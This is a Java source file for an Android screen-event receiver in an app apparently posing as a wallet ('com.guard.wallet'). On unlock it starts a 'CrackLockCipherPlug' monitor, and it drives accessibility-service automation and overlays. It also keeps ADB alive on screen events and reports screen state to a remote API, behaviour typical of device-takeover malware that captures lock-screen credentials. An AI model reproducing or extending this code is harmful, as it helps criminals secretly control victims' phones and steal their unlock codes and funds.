package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.ListenWindowHelper;
import com.guard.wallet.helper.OverlayViewHelper;
import com.guard.wallet.helper.AutomationHelper;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.plug.CrackLockCipherPlug;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import com.guard.wallet.utils.SnowflakeIdGenerator;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class ScreenBroadcastReceiver extends BroadcastReceiver {
    private static final String TAG = "ScreenBroadcastReceiver";
    public static final SnowflakeIdGenerator b = new SnowflakeIdGenerator(1L);
    public final AtomicInteger a = new AtomicInteger(1);

    public static void a(int screenState) {
        try {
            String subscribeId = SharedPrefsManager.l("lockSubscribeId");
            if (!AppUtils.B(subscribeId)) {
                ReqListenHelper req = new ReqListenHelper(subscribeId, screenState);
                HttpApiManager.finishListenHelper(req);
                SharedPrefsManager.w("lockSubscribeId");
            }

            if (AutomationHelper.k()) {
                AutomationHelper.g(screenState == 4);
            }

            OverlayViewHelper.f(null, screenState == 4);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    @Override
    public final void onReceive(Context context, Intent intent) {
        try {
            this.a.set(1);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return;
        }

        if (intent == null) {
            return;
        }

        try {
            if (AppUtils.B(intent.getAction())) {
                return;
            }

            String action = intent.getAction();
            int state = mapActionToState(action);
            if (state == -1) {
                return;
            }

            if (state == 0) {
                handleScreenOff();
            } else if (state == 1) {
                handleScreenOn();
            } else if (state == 2) {
                Log.d(TAG, "手机开启屏保、进入休眠");
            } else if (state == 3) {
                Log.d(TAG, "手机停止屏保、退出休眠");
            } else if (state == 4) {
                handleUserPresent();
            }

            if (!Objects.equals(0, Integer.valueOf(state))) {
                LockActivity.a();
            }

            SharedPrefsManager.D(Integer.valueOf(state), "screenState");
            SharedPrefsManager.H(state, intent.getAction());
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    private void handleScreenOff() {
        Log.d(TAG, "手机息屏了");
        a(0);

        if (MyAccessibilityService.P() != null) {
            if (MyAccessibilityService.P().j()) {
                MyAccessibilityService.q2.set(true);
                Log.d(TAG, "stopLocalAccessibilityDelegate");
                MyAccessibilityService.P().D();
            }
            MyAccessibilityService.P().H(true, false);
        }

        if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_OFF");
            if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                CrackLockCipherPlug.clearCacheIfInactive();
            }
        }

        ListenWindowHelper.a();
        SharedPrefsManager.w("lockBatchId");
    }

    private void handleScreenOn() {
        Log.d(TAG, "手机亮屏了");
        if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_ON");
        }

        if (SystemHelper.p0()) {
            SharedPrefsManager.D(b.nextId(), "lockBatchId");
        }
    }

    private void handleUserPresent() {
        Log.d(TAG, "手机解锁了");

        if (MainApplication.getInstance() != null) {
            if (!MainApplication.getInstance().isUserUnlockedInstance()) {
                MainApplication.getInstance().unlockedInstance();
            }
            if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                CrackLockCipherPlug.startMonitoring();
            }
            MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
        }

        a(4);

        AtomicBoolean wasRunning = MyAccessibilityService.q2;
        if (wasRunning.get()) {
            wasRunning.set(false);
            SystemHelper.F0(2);
        }
    }

    private int mapActionToState(String action) {
        if ("android.intent.action.SCREEN_OFF".equals(action)) {
            return 0;
        }
        if ("android.intent.action.SCREEN_ON".equals(action)) {
            return 1;
        }
        if ("android.intent.action.DREAMING_STARTED".equals(action)) {
            return 2;
        }
        if ("android.intent.action.DREAMING_STOPPED".equals(action)) {
            return 3;
        }
        if ("android.intent.action.USER_PRESENT".equals(action)) {
            return 4;
        }
        return -1;
    }
}
